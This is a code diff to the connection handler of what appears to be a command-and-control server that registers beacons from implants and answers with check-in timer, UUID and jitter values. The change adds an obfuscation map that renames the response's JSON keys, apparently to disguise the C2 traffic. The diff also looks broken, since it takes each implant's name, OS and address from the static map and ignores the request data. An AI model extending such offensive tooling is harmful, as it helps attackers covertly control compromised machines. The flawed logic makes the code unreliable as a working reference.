@@ -6,7 +6,7 @@ import zlib
 import json
 from http.server import BaseHTTPRequestHandler
 
-from Modules.global_objects import config, logger
+from Modules.global_objects import config, logger, obfuscation_map
 from Modules.beacon.beacon import add_beacon_list
 
 from Modules.beacon.beacon_server.socket_manager import socketio
@@ -25,19 +25,34 @@ def handle_connection_request(handler: BaseHTTPRequestHandler, match: dict):
         handler.send_response(400)
         handler.end_headers()
         return
+    
+    # normalize the obfuscation mapping: prefer obfuscation_map["generic"]["implant_info"] shape but support simple mapping
+    generic = obfuscation_map.get("generic", {})
+    implant_info = generic.get("implant_info", {}) if isinstance(generic.get("implant_info", {}), dict) else {}
 
-    if data and 'name' in data and 'os' in data and 'address' in data:
+    # try values from implant_info first (actual values), then from a flat generic mapping (names/keys)
+    name_val = implant_info.get("Name") or generic.get("name")
+    os_val = implant_info.get("os") or generic.get("os")
+    address_val = implant_info.get("address") or generic.get("address")
+
+    if data and name_val and os_val and address_val:
         userID = str(uuid.uuid4())
-        logger.info(f"New connection from {data['name']} on {data['os']} at {data['address']} with UUID {userID}")
+        logger.info(f"New connection from {name_val} on {os_val} at {address_val} with UUID {userID}")
 
         add_beacon_list(
-            userID, data['address'], data['name'], data['os'], time.strftime('%Y-%m-%d %H:%M:%S'),
+            userID, address_val, name_val, os_val, time.strftime('%Y-%m-%d %H:%M:%S'),
             config['beacon']["interval"], config['beacon']['jitter'], config
         )
 
+        # determine the JSON keys to use in the response; prefer explicit mapping from generic, then implant_info, then defaults
+        timer_key = generic.get("timer") or implant_info.get("timer") or "timer"
+        uuid_key = generic.get("uuid") or implant_info.get("uuid") or "uuid"
+        jitter_key = generic.get("jitter") or implant_info.get("jitter") or "jitter"
+
         response_body = json.dumps({
-            "timer": config['beacon']["interval"],
-            "uuid": userID, "jitter": config['beacon']['jitter']
+            timer_key: config['beacon']["interval"],
+            uuid_key: userID,
+            jitter_key: config['beacon']['jitter']
         }).encode('utf-8')
 
         handler.send_response(200)
